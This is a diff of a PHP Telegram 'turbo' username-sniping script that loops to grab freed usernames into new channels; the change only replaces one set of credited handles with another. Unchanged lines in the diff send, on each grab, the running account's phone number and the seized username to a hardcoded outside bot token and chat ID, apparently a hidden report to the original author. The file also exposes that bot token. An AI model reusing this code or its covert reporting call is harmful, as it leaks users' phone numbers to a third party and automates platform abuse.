@@ -23,7 +23,7 @@ $MadelineProto->start();
 $info = json_decode(file_get_contents('info.json'),true);
 $num = $info["number1"];
 $x= file_get_contents('xa');
-$updates = $MadelineProto->channels->createChannel(['broadcast' => true,'megagroup' => false,'title' => '- BESSO اسيادكم .', ]);
+$updates = $MadelineProto->channels->createChannel(['broadcast' => true,'megagroup' => false,'title' => '- اسيادكم  alsh bg .', ]);
 $chat_mack = $updates['updates'][1];
 do{
 	file_put_contents('xa',$x++);
@@ -40,10 +40,10 @@ file_put_contents('in.json', json_encode($info));
                     try{
                         $MadelineProto->channels->updateUsername(['channel' => $chat_mack, 'username' => $user]);                      
                         $ch = file_get_contents("ch");
-bot('sendMessage', ['chat_id' => file_get_contents("ID"), 'text' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @besso5 or @bessoksk"]);
-     $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @besso5";
+bot('sendMessage', ['chat_id' => file_get_contents("ID"), 'text' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @bg5 or @bgksk"]);
+     $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @bg5";
 file_get_contents("https://api.telegram.org/bot6139407487:AAFZwY4o9vvzQA0v3TYTx4-rll1Bd6t5qfY/sendvideo?chat_id=-1001907317826&video=https://t.me/bestc45/3&caption=".urlencode($caption));                   
-$MadelineProto->messages->sendMessage(['peer' => $chat_mack, 'message' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @besso5 or @bessoksk"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_mack, 'message' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @bg5 or @bgksk"]);
                         $data = str_replace("\n".$user,"", file_get_contents("users"));
                         file_put_contents("users", $data);
                     }catch(Exception $e){
@@ -56,10 +56,10 @@ $MadelineProto->messages->sendMessage(['peer' => $chat_mack, 'message' => "• H
                          $updates = $MadelineProto->channels->createChannel(['broadcast' => true,'megagroup' => false,'title' => file_get_contents("name"), ]);
                         $chat = $updates['updates'][1];
                         $MadelineProto->channels->updateUsername(['channel' => $chat, 'username' => $user]);
-                        bot('sendMessage', ['chat_id' => file_get_contents("ID"), 'text' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @besso5 or @bessoksk"]);
-                        $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @besso5";
+                        bot('sendMessage', ['chat_id' => file_get_contents("ID"), 'text' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @bg5 or @bgksk"]);
+                        $caption="• Hi Night Swapped 🐊\n—————————\n-NUMBER ➪ [$num]\n—————————\n- Done ➪ [ @$user ]\n- Loops ➪ [ $x ]\n- Save ➪ [ Account ]\n—————————\n• Turbo : @bg5";
 file_get_contents("https://api.telegram.org/bot6139407487:AAFZwY4o9vvzQA0v3TYTx4-rll1Bd6t5qfY/sendvideo?chat_id=-1001907317826&video=https://t.me/bestc45/3&caption=".urlencode($caption));
-$MadelineProto->messages->sendMessage(['peer' => $chat_mack, 'message' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @besso5 or @bessoksk"]);
+$MadelineProto->messages->sendMessage(['peer' => $chat_mack, 'message' => "• Hi Night Swapped 🐊\n—————————\n- Done ➪ ( @$user )\n- Loops ➪ ( $x )\n- Save ➪ ( Channel )\n—————————\n• Turbo : @bg5 or @bgksk"]);
                         $data = str_replace("\n".$user,"", file_get_contents("users"));
                         file_put_contents("users", $data);
                         }elseif($e->getMessage() == "USERNAME_OCCUPIED"){
